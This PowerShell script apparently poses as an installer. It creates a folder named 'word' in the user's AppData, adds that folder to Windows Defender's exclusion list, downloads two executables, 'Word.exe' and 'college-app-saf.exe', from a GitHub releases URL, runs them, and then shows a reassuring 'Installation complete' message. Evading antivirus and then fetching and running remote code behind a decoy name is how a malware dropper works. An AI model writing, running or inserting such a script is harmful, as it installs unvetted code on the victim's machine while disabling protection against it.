# Load Windows Forms for displaying a message box
Add-Type -AssemblyName System.Windows.Forms

# Set up the folder path in %appdata%
$folderPath = Join-Path -Path $env:APPDATA -ChildPath "word"

# Create the folder if it doesn't exist
if (!(Test-Path -Path $folderPath)) {
    New-Item -ItemType Directory -Path $folderPath | Out-Null
    Write-Output "Created folder: $folderPath"
} else {
    Write-Output "Folder already exists: $folderPath"
}

# Add the folder to Windows Defender's exclusion list
Add-MpPreference -ExclusionPath $folderPath
Write-Output "Whitelist complete."

# Download and run Word.exe
$url1 = "https://github.com/jstankovic2/fade_urls/releases/download/dddd/Word.exe"
$destination1 = Join-Path -Path $folderPath -ChildPath "Word.exe"
Invoke-WebRequest -Uri $url1 -OutFile $destination1
Write-Output "Download of Word.exe complete."
Start-Process -FilePath $destination1
Write-Output "Word.exe started."

# Download and run college-app-saf.exe
$url2 = "https://github.com/jstankovic2/fade_urls/releases/download/dtfghkjmftyuk/college-app-saf.exe"
$destination2 = Join-Path -Path $folderPath -ChildPath "college-app-saf.exe"
Invoke-WebRequest -Uri $url2 -OutFile $destination2
Write-Output "Download of college-app-saf.exe complete."
Start-Process -FilePath $destination2
Write-Output "college-app-saf.exe started."

# Display the completion message
[System.Windows.Forms.MessageBox]::Show("Installation complete. You can close this window.", "Installation Status", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Information)
